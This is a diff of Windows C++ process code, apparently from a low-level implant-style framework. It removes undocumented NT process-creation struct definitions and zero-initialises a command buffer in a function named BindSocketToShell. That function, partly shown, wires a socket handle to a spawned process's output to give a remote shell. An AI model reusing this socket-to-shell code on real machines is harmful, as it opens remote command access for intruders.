@@ -13,95 +13,6 @@
 #include "core/memory/memory.h"
 #include "platform/common/windows/peb.h"
 
-// Process creation structures for Windows
-struct PS_ATTRIBUTE
-{
-	USIZE Attribute;
-	USIZE Size;
-	union
-	{
-		USIZE Value;
-		PVOID ValuePtr;
-	};
-	PUSIZE ReturnLength;
-};
-
-struct PS_ATTRIBUTE_LIST
-{
-	USIZE TotalLength;
-	PS_ATTRIBUTE Attributes[2];
-};
-
-struct PS_CREATE_INFO
-{
-	USIZE Size;
-	USIZE State;
-	union
-	{
-		struct
-		{
-			union
-			{
-				UINT32 InitFlags;
-				struct
-				{
-					UINT8 WriteOutputOnExit : 1;
-					UINT8 DetectManifest : 1;
-					UINT8 IFEOSkipDebugger : 1;
-					UINT8 IFEODoNotPropagateKeyState : 1;
-					UINT8 SpareBits1 : 4;
-					UINT8 SpareBits2 : 8;
-					UINT16 ProhibitedImageCharacteristics;
-				};
-			};
-			UINT32 AdditionalFileAccess;
-		} InitState;
-
-		struct
-		{
-			PVOID FileHandle;
-		} FailSection;
-
-		struct
-		{
-			UINT16 DllCharacteristics;
-		} ExeFormat;
-
-		struct
-		{
-			PVOID IFEOKey;
-		} ExeName;
-
-		struct
-		{
-			union
-			{
-				UINT32 OutputFlags;
-				struct
-				{
-					UINT8 ProtectedProcess : 1;
-					UINT8 AddressSpaceOverride : 1;
-					UINT8 DevOverrideEnabled : 1;
-					UINT8 ManifestDetected : 1;
-					UINT8 ProtectedProcessLight : 1;
-					UINT8 SpareBits1 : 3;
-					UINT8 SpareBits2 : 8;
-					UINT16 SpareBits3;
-				};
-			};
-			PVOID FileHandle;
-			PVOID SectionHandle;
-			UINT64 UserProcessParametersNative;
-			UINT32 UserProcessParametersWow64;
-			UINT32 CurrentParameterFlags;
-			UINT64 PebAddressNative;
-			UINT32 PebAddressWow64;
-			UINT64 ManifestAddress;
-			UINT32 ManifestSize;
-		} SuccessState;
-	};
-};
-
 // Windows doesn't have fork() - use stub implementation
 Result<SSIZE, Error> Process::Fork() noexcept
 {
@@ -152,7 +63,7 @@ Result<SSIZE, Error> Process::BindSocketToShell(SSIZE socketFd, const CHAR *cmd)
 	si.hStdError = h;
 
 	PROCESS_INFORMATION pi = {};
-	WCHAR cmdWide[260];
+	WCHAR cmdWide[260]{};
 	StringUtils::Utf8ToWide(Span<const CHAR>(cmd, StringUtils::Length(cmd)), Span<WCHAR>(cmdWide, 260));
 
 	auto createResult = Kernel32::CreateProcessW(
